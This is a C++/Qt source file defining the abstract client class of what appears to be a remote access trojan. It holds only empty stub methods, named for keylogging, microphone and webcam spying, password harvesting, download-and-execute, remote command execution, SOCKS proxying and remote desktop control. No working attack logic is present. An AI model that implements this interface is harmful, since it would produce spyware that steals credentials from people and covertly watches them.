#include "abstractclient.h"

QT_WARNING_PUSH
QT_WARNING_DISABLE_CLANG("-Wreturn-type")
QT_WARNING_DISABLE_CLANG("-Wunused-parametere")

QT_WARNING_DISABLE_GCC("-Wreturn-type")
QT_WARNING_DISABLE_GCC("-Wunused-parameter")

#include <QHostAddress>

#include <QDebug>
#include <QProcess>

N_CLASS_IMPL(AbstractClient)
{

}

N_PROPERTY_IMPL(AbstractClient, QString, os, os, setOs, osChanged)
N_PROPERTY_IMPL(AbstractClient, QString, version, version, setVersion, versionChanged)
N_PROPERTY_IMPL(AbstractClient, int, platform, platform, setPlatform, platformChanged)

N_REMOTE_METHOD_IMPL(AbstractClient, ping)
{

}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, info)
{
    return QVariant();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, tasks)
{
    return QVariant();
}

N_REMOTE_METHOD_IMPL(AbstractClient, messageBox, QString, title, QString, text, int, icons)
{
    Q_UNUSED(icons)
    Q_UNUSED(text)
    Q_UNUSED(title)
}


N_REMOTE_METHOD_IMPL(AbstractClient, int, killProcess, int, pid)
{
    Q_UNUSED(pid)
    return 0;
}


N_REMOTE_METHOD_IMPL(AbstractClient, test, int, n)
{
    Q_UNUSED(n)
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, startupItems)
{
    return QVariant();
}


N_REMOTE_METHOD_IMPL(AbstractClient, shutdown)
{}

N_REMOTE_METHOD_IMPL(AbstractClient, reboot)
{}

N_REMOTE_METHOD_IMPL(AbstractClient, logout)
{}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, execute, QString, command, QString, dir)
{
    Q_UNUSED(command)
    Q_UNUSED(dir)
    return QString();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QImage, screenshot)
{
    return QImage();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QImage, webcamImage)
{
    return QImage();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, dirEntries, QString, path)
{
    Q_UNUSED(path)
    return QVariant();
}


N_REMOTE_METHOD_IMPL(AbstractClient, visitWebsite, QString, url, int, mode)
{
    Q_UNUSED(mode)
    Q_UNUSED(url)
}


//webcam
N_REMOTE_METHOD_IMPL(AbstractClient, QStringList, cameras)
{
    return QStringList();
}
N_REMOTE_METHOD_IMPL(AbstractClient, bool, startCamera, QByteArray, deviceName)
{
    Q_UNUSED(deviceName)
    return false;
}
N_REMOTE_METHOD_IMPL(AbstractClient, stopCamera)
{}

N_REMOTE_METHOD_IMPL(AbstractClient, QImage, cameraFrame)
{
    return QImage();
}

QT_WARNING_POP

QString AbstractClient::address() const
{
    if (!hub())
        return QString();
    return hub()->localAddress().toString();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, systemInformations)
{
    return QVariant();
}


N_REMOTE_METHOD_IMPL(AbstractClient, bool, startVnc)
{
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, startRemoteDesktop, int, width, int, heigth, int, colors, int, port)
{
    Q_UNUSED(port)
    Q_UNUSED(width)
    Q_UNUSED(heigth)
    Q_UNUSED(colors)
    return false;
}
N_REMOTE_METHOD_IMPL(AbstractClient, endRemoteDesktop)
{

}

N_REMOTE_METHOD_IMPL(AbstractClient, void, mouseClick, QPoint, pt, int, key)
{
    Q_UNUSED(pt)
    Q_UNUSED(key)
}
N_REMOTE_METHOD_IMPL(AbstractClient, void, mousePress, QPoint, pt, int, key)
{
    Q_UNUSED(pt)
    Q_UNUSED(key)
}
N_REMOTE_METHOD_IMPL(AbstractClient, void, mouseRelease, QPoint, pt, int, key)
{
    Q_UNUSED(pt)
    Q_UNUSED(key)
}
N_REMOTE_METHOD_IMPL(AbstractClient, void, mouseMove, QPoint, pt, int, key)
{
    Q_UNUSED(pt)
    Q_UNUSED(key)
}

N_REMOTE_METHOD_IMPL(AbstractClient, keyPress, int, key, int, modif)
{
    Q_UNUSED(key)
    Q_UNUSED(modif)
}

N_REMOTE_METHOD_IMPL(AbstractClient, lockDesktop)
{}
N_REMOTE_METHOD_IMPL(AbstractClient, unlockDesktop)
{}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, startKeylogger)
{
    return false;
}
N_REMOTE_METHOD_IMPL(AbstractClient, bool, queryKeylogger)
{
    return false;
}
N_REMOTE_METHOD_IMPL(AbstractClient, bool, stopKeylogger)
{
    return false;
}
N_REMOTE_METHOD_IMPL(AbstractClient, QString, keyloggerFile)
{
    return QString();
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, startSocksProxy, int, port, qreal, throttle)
{
    Q_UNUSED(port)
    Q_UNUSED(throttle)
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, querySocksProxy)
{
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, requestNewConnection)
{
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, endSocksProxy)
{
    return false;
}


//mic spy
N_REMOTE_METHOD_IMPL(AbstractClient, QStringList, micList)
{
    return QStringList();
}
N_REMOTE_METHOD_IMPL(AbstractClient, bool, startMicSpy, QString, deviceName, int, port)
{
    Q_UNUSED(port)
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, queryMicSpy)
{
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, bool, stopMicSpy)
{
    return false;
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariantList, passwords)
{
    return QVariantList();
}

N_REMOTE_METHOD_IMPL(AbstractClient, void, downloadAndExec, QString, url)
{
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, detector)
{
    return QVariant();
}

N_REMOTE_METHOD_IMPL(AbstractClient, QVariant, grabUrls)
{
    return QVariant();
}
